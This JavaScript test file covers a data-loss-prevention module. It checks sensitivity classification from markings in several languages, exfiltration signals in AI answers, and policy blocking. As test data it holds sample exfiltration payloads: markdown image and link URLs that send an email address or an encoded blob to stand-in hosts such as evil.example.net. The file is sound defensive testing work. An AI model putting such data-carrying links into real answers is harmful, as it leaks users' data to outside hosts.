'use strict';

/**
 * classification and exfiltration.
 *   CL-01  levels from findings and from markings (several languages, diacritics), combined confidence, tenant marking lists
 *   CL-02  exfiltration signals: new sensitive data, data-carrying links and images, bulk records, encoded blobs
 *   CL-03  policy integration through the DLP stage (classification BLOCK / DETECT, exfiltration BLOCK on the answer, what the user supplied is not exfiltration)
 */

const { scan } = require('../engine');
const { classify, exfiltration, LEVELS } = require('../classify');
const { luhn } = require('../detectors');

const card = (() => { const b = '411111111111111'; for (let c = 0; c < 10; c++) if (luhn(b + c)) return b + c; throw new Error('x'); })();
const cls = (t, o) => classify(t, scan(t).findings, o);

describe('CL-01 classification', () => {
  test('findings set the level: personal data CONFIDENTIAL, financial / credential RESTRICTED, nothing PUBLIC', () => {
    expect(cls('The weather is nice today.').level).toBe('PUBLIC');
    expect(cls('write to jane.roe@example.org').level).toBe('CONFIDENTIAL');
    expect(cls(`card ${card}`).level).toBe('RESTRICTED');
    expect(cls('key ' + 'AK' + 'IA' + 'ABCDEFGHIJKLMNOP').level).toBe('RESTRICTED');
    expect(cls(`card ${card} and jane.roe@example.org`).level).toBe('RESTRICTED');
  });
  test('markings in several languages and with diacritics', () => {
    expect(cls('Document STRICT CONFIDEN'+String.fromCharCode(0x021a)+'IAL').level).toBe('RESTRICTED');          // Romanian, with the comma-below T
    expect(cls('Strictly Confidential: board minutes').level).toBe('RESTRICTED');
    expect(cls('Streng vertraulich').level).toBe('RESTRICTED');
    expect(cls('Document confidențial').level).toBe('CONFIDENTIAL');
    expect(cls('For internal use only').level).toBe('INTERNAL');
    expect(cls('Uz intern').level).toBe('INTERNAL');
  });
  test('a marking must be a whole phrase, not a substring', () => {
    expect(cls('the secretary secretly internalised it').level).toBe('PUBLIC');
  });
  test('independent signals raise the confidence (noisy-OR, capped); a single weak signal does not reach a level', () => {
    const one = cls('write to jane.roe@example.org'); const two = cls('Confidential. write to jane.roe@example.org');
    expect(two.level).toBe('CONFIDENTIAL'); expect(two.confidence).toBeGreaterThan(one.confidence); expect(two.confidence).toBeLessThanOrEqual(0.99);
    expect(classify('call (555) 123-4567', scan('call (555) 123-4567').findings).level).toBe('CONFIDENTIAL');   // PHONE has confidence 0.55, above the 0.5 bar
    expect(classify('x', [{ rule: 'PHONE', category: 'PII', confidence: 0.3 }]).level).toBe('PUBLIC');
  });
  test('tenant marking lists extend the built-in ones', () => {
    expect(cls('Project Falcon notes').level).toBe('PUBLIC');
    expect(cls('Project Falcon notes', { markings: { RESTRICTED: ['project falcon'] } }).level).toBe('RESTRICTED');
    expect(LEVELS).toEqual(['PUBLIC', 'INTERNAL', 'CONFIDENTIAL', 'RESTRICTED']);
  });
});

describe('CL-02 exfiltration signals', () => {
  const sig = (out, o) => exfiltration(out, scan(out).findings, o).signals.map((s) => s.signal);
  test('sensitive data the user did not supply is flagged; data the user supplied is not', () => {
    const out = `The account holder is jane.roe@example.org and the card is ${card}.`;
    expect(sig(out, { inputText: 'who is the account holder?' })).toContain('NEW_SENSITIVE_IN_OUTPUT');
    expect(sig(out, { inputText: `my mail is jane.roe@example.org and my card ${card}` })).not.toContain('NEW_SENSITIVE_IN_OUTPUT');
    expect(sig('The sky is blue.', {})).toEqual([]);
  });
  test('a markdown image or link that carries data to a host that is not allow-listed', () => {
    const img = `Here you go ![x](https://evil.example.net/p.png?d=jane.roe@example.org)`;
    const s = exfiltration(img, scan(img).findings, {}).signals.find((x) => x.signal === 'URL_EXFIL');
    expect(s).toMatchObject({ severity: 'HIGH' });
    expect(sig(img, { allowHosts: ['evil.example.net'] })).not.toContain('URL_EXFIL');
    expect(sig(img, { allowHosts: ['*.example.net'] })).not.toContain('URL_EXFIL');
    const enc = `see [report](https://collect.example.net/x?q=${'A1b2'.repeat(15)})`;
    expect(exfiltration(enc, [], {}).signals.map((x) => x.signal)).toContain('URL_EXFIL');
    expect(exfiltration('see [docs](https://docs.example.com/guide?page=2)', [], {}).signals).toEqual([]);
  });
  test('bulk records and encoded blobs', () => {
    const many = Array.from({ length: 12 }, (_, i) => `user${i}@example.org`).join(', ');
    expect(sig(many, { inputText: many })).toContain('BULK_RECORDS');
    expect(sig('x'.repeat(10) + Buffer.alloc(400, 7).toString('base64'), {})).toContain('ENCODED_BLOB');
    expect(sig('a normal sentence of moderate length.', {})).toEqual([]);
  });
});

describe('CL-03 through the DLP stage', () => {
  const ext = require('../../../src/core/dlp/extensionPoint');
  const svc = require('../../../src/core/dlp/dlpService');
  const evalr = require('../../../services/policy/evaluators/dlp');
  const live = (config, over = {}) => { evalr.validate(config); return { id: 'P', type: 'DLP', priority: 1, enabled: true, config: evalr.preprocess(config), ...over }; };
  beforeEach(() => { process.env.QODIQA_DLP_TOKEN_KEY = 'q'.repeat(40); ext._set(undefined); });
  afterAll(() => { delete process.env.QODIQA_DLP_TOKEN_KEY; });
  const base = { dlpFormat: 1, direction: 'input', action: 'DETECT', rules: ['*'] };

  test('validation of the new keys', () => {
    for (const bad of [{ classification: { minLevel: 'PUBLIC', action: 'BLOCK' } }, { classification: { minLevel: 'RESTRICTED', action: 'REDACT' } }, { classification: { minLevel: 'RESTRICTED' } },
      { classification: { minLevel: 'RESTRICTED', action: 'BLOCK', extra: 1 } }, { exfiltration: { action: 'BLOCK' } }, { direction: 'output', exfiltration: { action: 'DELETE' } },
      { direction: 'output', exfiltration: { action: 'BLOCK', allowHosts: ['bad host'] } }, { direction: 'output', exfiltration: { action: 'BLOCK', bulkThreshold: 1 } }])
      expect(() => evalr.validate({ ...base, ...bad })).toThrow();
    expect(() => evalr.validate({ ...base, direction: 'both', classification: { minLevel: 'CONFIDENTIAL', action: 'BLOCK', markings: { RESTRICTED: ['project falcon'] } }, exfiltration: { action: 'DETECT', allowHosts: ['*.example.com'] } })).not.toThrow();
  });
  test('classification BLOCK stops a confidential request; below the level it passes; DETECT only records', () => {
    const p = live({ ...base, classification: { minLevel: 'CONFIDENTIAL', action: 'BLOCK' } });
    const b = svc.applyToBody({ prompt: 'Confidential: our plan for next year' }, [p]);
    expect(b).toMatchObject({ blocked: true, reason: 'DLP_BLOCKED' }); expect(b.events[0]).toMatchObject({ rules: ['CLASS:CONFIDENTIAL'], action: 'BLOCK', classification: { level: 'CONFIDENTIAL' } });
    expect(svc.applyToBody({ prompt: 'For internal use only: lunch menu' }, [p]).blocked).toBe(false);
    const d = svc.applyToBody({ prompt: 'Confidential: our plan' }, [live({ ...base, classification: { minLevel: 'CONFIDENTIAL', action: 'DETECT' } })]);
    expect(d.blocked).toBe(false); expect(d.events[0]).toMatchObject({ action: 'DETECT', rules: ['CLASS:CONFIDENTIAL'] });
  });
  test('exfiltration BLOCK on the answer; what the user supplied does not count', () => {
    const p = live({ dlpFormat: 1, direction: 'output', action: 'DETECT', rules: ['*'], exfiltration: { action: 'BLOCK', allowHosts: ['docs.example.com'] } });
    const leak = svc.applyToText(`The holder is jane.roe@example.org`, [p], { inputTexts: ['who is the holder?'] });
    expect(leak).toMatchObject({ blocked: true, reason: 'DLP_BLOCKED' }); expect(leak.events[0].rules).toEqual(['EXFIL:NEW_SENSITIVE_IN_OUTPUT']);
    expect(JSON.stringify(leak.events)).not.toContain('jane.roe');
    expect(svc.applyToText(`You wrote jane.roe@example.org`, [p], { inputTexts: ['my mail is jane.roe@example.org'] }).blocked).toBe(false);
    const img = svc.applyToText('![x](https://evil.example.net/a.png?u=jane.roe@example.org)', [p], { inputTexts: ['jane.roe@example.org'] });
    expect(img.blocked).toBe(true); expect(img.events[0].rules).toContain('EXFIL:URL_EXFIL');
  });
});

describe('minimisation profiles', () => {
  const profiles = require('../profiles');
  const evalr = require('../../../services/policy/evaluators/dlp');
  const svc = require('../../../src/core/dlp/dlpService');
  const ext = require('../../../src/core/dlp/extensionPoint');
  beforeEach(() => { process.env.QODIQA_DLP_TOKEN_KEY = 'p'.repeat(40); ext._set(undefined); });
  afterAll(() => { delete process.env.QODIQA_DLP_TOKEN_KEY; });

  test('every rule of every profile validates and is a copy', () => {
    for (const name of profiles.names()) {
      const rules = profiles.profile(name);
      expect(rules.length).toBeGreaterThan(0);
      for (const r of rules) { expect(() => evalr.validate(r.config)).not.toThrow(); expect(r.type).toBe('DLP'); }
      rules[0].config.action = 'CHANGED'; expect(profiles.profile(name)[0].config.action).not.toBe('CHANGED');
    }
    expect(() => profiles.profile('nope')).toThrow(/unknown minimisation profile/);
  });
  test('standard redacts personal data before the provider and secrets in the answer; strict also screens tools', () => {
    const live = (rules) => rules.map((r) => ({ ...r, config: evalr.preprocess(r.config) }));
    const std = live(profiles.profile('standard'));
    const inn = svc.applyToBody({ prompt: 'mail jane.roe@example.org' }, std);
    expect(inn.body.prompt).toMatch(/\[\[EMAIL:/);
    const out = svc.applyToText('here: ' + 'AK' + 'IA' + 'ABCDEFGHIJKLMNOP', std);
    expect(out.text).toMatch(/\[\[KEY_AWS_ACCESS:/);
    const strict = live(profiles.profile('strict'));
    expect(svc.applyToToolArgs({ note: 'card ' + '4111' + '111111111111' }, strict).blocked).toBe(true);
    expect(svc.applyToBody({ prompt: 'Strictly confidential memo' }, strict)).toMatchObject({ blocked: true, reason: 'DLP_BLOCKED' });
  });
});
